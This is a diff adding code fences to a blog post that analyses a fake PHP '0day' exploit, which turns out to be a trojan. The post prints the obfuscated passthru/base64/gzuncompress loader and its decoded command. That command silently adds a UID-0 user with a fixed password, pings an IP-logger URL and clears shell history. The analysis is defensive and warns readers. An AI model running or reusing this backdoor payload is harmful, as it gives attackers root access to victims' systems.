@@ -56,12 +56,15 @@ A 0day PHP exploit script has to be run as root? What? Okay, okay. Let's run as 
 
 Aha, so this is a 0day and we just have to run it against any website. No hint what the script actually should do to that remote website. So let's run it:
 
+```bash
         $: sudo php 0day.php http://localhost localhost
         sh: 1: history: not found
         Source of http://localhost saved to localhost
+```
 
 The script wrote the file *localhost*, when looking at the contents it shows us that:
 
+```html
         <html>
         <header>
         <title>Test</title>
@@ -70,9 +73,11 @@ The script wrote the file *localhost*, when looking at the contents it shows us 
         this is just a test
         </body>
         </html>
+```
 
 Okay, it just saved the output of the website to a file, the website had this script:
 
+```php
         <html>
         <header>
         <title>Test</title>
@@ -89,14 +94,18 @@ Let's dig deeper!
 
 Variable *$header* is just the fancy ASCII stuff at the beginning, so let's look at:
 
-        $bytes = array("passthru", "base64_decode");
+```php
+    $bytes = array("passthru", "base64_decode");
     @array_push($bytes, "gzuncompress", "base64_decode");
     var_dump($bytes);
     @$bytes[0]($bytes[1]($bytes[2]($bytes[3]('eJw1yrsOgjAYQOFXgiIkDg4NxlJDQRG5dORvUqAFScAWfHoZdDrD+USVaBguiod4abynZHv5hi0lmWIRk7cOG04KFCPfbYiVrD8MLF90jVrzMwFHxbsZ1ZrmyqWRlfuzdZV8BLr/fS+q60xDZwGkZ176DiWtIyIcxNtxArIajoSGzjcwgGHVy3ucmUxRO4GXGRiVjEt2+gKxYTqF'))));
+```
 
 *var_dump($bytes)* gives me the way how the encoded string will be processed, so let's add an *echo* at the right place:
 
-        array (size=4)
+```php
+        
+	array (size=4)
           0 => string 'passthru' (length=8)
           1 => string 'base64_decode' (length=13)
           2 => string 'gzuncompress' (length=12)
@@ -107,10 +116,13 @@ Variable *$header* is just the fancy ASCII stuff at the beginning, so let's look
     var_dump($bytes);
     @$bytes[0]($bytes[1]($bytes[2]($bytes[3]('eJw1yrsOgjAYQOFXgiIkDg4NxlJDQRG5dORvUqAFScAWfHoZdDrD+USVaBguiod4abynZHv5hi0lmWIRk7cOG04KFCPfbYiVrD8MLF90jVrzMwFHxbsZ1ZrmyqWRlfuzdZV8BLr/fS+q60xDZwGkZ176DiWtIyIcxNtxArIajoSGzjcwgGHVy3ucmUxRO4GXGRiVjEt2+gKxYTqF'))));
     echo $bytes[1]($bytes[2]($bytes[3]('eJw1yrsOgjAYQOFXgiIkDg4NxlJDQRG5dORvUqAFScAWfHoZdDrD+USVaBguiod4abynZHv5hi0lmWIRk7cOG04KFCPfbYiVrD8MLF90jVrzMwFHxbsZ1ZrmyqWRlfuzdZV8BLr/fS+q60xDZwGkZ176DiWtIyIcxNtxArIajoSGzjcwgGHVy3ucmUxRO4GXGRiVjEt2+gKxYTqF')));
+```
 
 Which gives me:
 
+```bash
         useradd -ou 0 -g 0 dd0s > /dev/null 2>&1;echo dd0s:genny1995 | chpasswd 2>&1;curl --silent http://iplogger.org/1z7H3 ;history -c
+```
 
 Hu, that is no remote exploit. That adds silently a user with password and **ID 0**. Yes, **0**. **0 is root**. So this user might handled with root privileges. Also it curls an URL, this is just there to log IP accessing it, so the crooks just wait until IP's are arriving and then open SSH connections as user dd0s with password genny1995. Curl just recieves a blank GIF image:
 
@@ -119,11 +131,15 @@ Hu, that is no remote exploit. That adds silently a user with password and **ID 
 Okay, as we see, this is some kind of a honeytrap. Kiddies, wannabe hackers and researchers might think they found a new cool exploit, run this script as root (as it requests) and get owned. So the crooks just login to that user with an ID of 0.
 To delete that user run:
 
+```bash
         userdel -f dd0s
+```
 
 You will get this warning:
 
+```bash
         userdel: user dd0s is currently used by process 1
+```
 
 That is because it has the same id as root.
 
@@ -142,6 +158,7 @@ And to the crooks which are spreading that script: we are right hunting you. Pre
 
 Script:
 
+```php
         <?php
         /*
         # Exploit Title: Source Disclosure 2015 0day - All versions, All Browsers
@@ -195,3 +212,4 @@ Script:
         }
         duplicate_source($argv[1], $argv[2]);
         ?>
+```
